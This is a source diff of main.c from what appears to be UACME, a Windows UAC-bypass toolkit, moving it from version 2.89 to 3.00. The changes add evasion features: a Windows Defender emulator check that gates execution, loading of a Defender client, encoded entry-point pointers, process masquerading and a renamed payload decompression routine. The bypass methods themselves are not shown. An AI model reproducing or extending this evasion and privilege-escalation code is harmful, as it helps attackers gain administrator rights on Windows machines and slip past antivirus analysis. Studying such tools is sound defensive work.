@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     2.89
+*  VERSION:     3.00
 *
-*  DATE:        01 July 2018
+*  DATE:        25 Aug 2018
 *
 *  Program entry point.
 *
@@ -22,11 +22,10 @@
 #pragma comment(lib, "opengl32.lib")
 #pragma comment(lib, "comctl32.lib")
 
-UACMECONTEXT g_ctx;
+UACMECONTEXT g_ctx = { FALSE, 0, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0, 0, {0}, {0}, {0}, {0}, {0} };
 TEB_ACTIVE_FRAME_CONTEXT g_fctx = { 0, "(=^..^=)" };
 
 static pfnDecompressPayload pDecryptPayload = NULL;
-
 
 /*
 * ucmDummyWindowProc
@@ -76,10 +75,14 @@ UINT ucmInit(
     HDC         dc1;
     int         index;
 
+    ULONG       k;
+
     RTL_OSVERSIONINFOW osv;
 
 #ifndef _DEBUG
     TOKEN_ELEVATION_TYPE    ElevType;
+#else 
+    NTSTATUS                Status = STATUS_UNSUCCESSFUL;
 #endif	
 
     ULONG bytesIO;
@@ -109,7 +112,7 @@ UINT ucmInit(
             break;
         }
 
-        if (FAILED(CoInitialize(NULL))) {
+        if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED))) {
             Result = ERROR_INTERNAL_ERROR;
             break;
         }
@@ -119,12 +122,16 @@ UINT ucmInit(
         //fill common data block
         RtlSecureZeroMemory(&g_ctx, sizeof(g_ctx));
 
+        k = ~GetTickCount();
+        g_ctx.Cookie = RtlRandomEx(&k);
         g_ctx.IsWow64 = supIsProcess32bit(GetCurrentProcess());
         g_ctx.ucmHeap = RtlCreateHeap(HEAP_GROWABLE, NULL, 0, 0, NULL, NULL);
         if (g_ctx.ucmHeap == NULL) {
             Result = ERROR_NOT_ENOUGH_MEMORY;
             break;
         }
+
+        RtlSetHeapInformation(g_ctx.ucmHeap, HeapEnableTerminationOnCorruption, NULL, 0);
 
         if (g_ctx.IsWow64) {
             RtlSecureZeroMemory(&osv, sizeof(osv));
@@ -143,6 +150,17 @@ UINT ucmInit(
         if (g_ctx.dwBuildNumber < 7000) {
             Result = ERROR_INSTALL_PLATFORM_UNSUPPORTED;
             break;
+        }
+
+        if (g_ctx.dwBuildNumber > 7601) {
+#ifdef _DEBUG
+            g_ctx.hMpClient = wdLoadClient(g_ctx.IsWow64, &Status);
+            if (!NT_SUCCESS(Status)) {
+                supDebugPrint(L"wdLoadClient", Status);
+            }
+#else
+            g_ctx.hMpClient = wdLoadClient(g_ctx.IsWow64, NULL);
+#endif
         }
 
         g_ctx.AkagiFlag = AKAGI_FLAG_KILO;
@@ -233,6 +251,8 @@ UINT ucmInit(
             }
         }
 
+        g_ctx.hNtdll = GetModuleHandleW(NTDLL_DLL);
+
         //
         // Query basic directories.
         //       
@@ -309,7 +329,7 @@ UINT ucmInit(
 
         UnregisterClass(WndClassName, inst);
 
-        g_ctx.DecryptRoutine = pDecryptPayload;
+        g_ctx.DecompressRoutine = pDecryptPayload;
 
     } while (cond);
 
@@ -357,7 +377,7 @@ UINT ucmMain()
         return ERROR_INTERNAL_ERROR;
     }
 
-    supMasqueradeProcess();
+    supMasqueradeProcess(FALSE);
 
     if (MethodsManagerCall(Method))
         return ERROR_SUCCESS;
@@ -380,8 +400,10 @@ INT ucmSehHandler(
             uctx = (UACME_THREAD_CONTEXT *)uctx->Frame.Previous;
         }
         if (uctx) {
-            if (uctx->ucmMain)
+            if (uctx->ucmMain) {
+                uctx->ucmMain = supDecodePointer(uctx->ucmMain);
                 uctx->ReturnedResult = uctx->ucmMain();
+            }
         }
         return EXCEPTION_EXECUTE_HANDLER;
     }
@@ -406,7 +428,7 @@ VOID main()
     if (wdIsEmulatorPresent() == STATUS_NOT_SUPPORTED) {
 
         uctx.Frame.Context = &g_fctx;
-        uctx.ucmMain = (pfnEntryPoint)ucmMain;
+        uctx.ucmMain = (pfnEntryPoint)supEncodePointer(ucmMain);
         RtlPushFrame((PTEB_ACTIVE_FRAME)&uctx);
 
         __try {
@@ -423,4 +445,3 @@ VOID main()
     if (v > 0) 
         ExitProcess(uctx.ReturnedResult);
 }
-
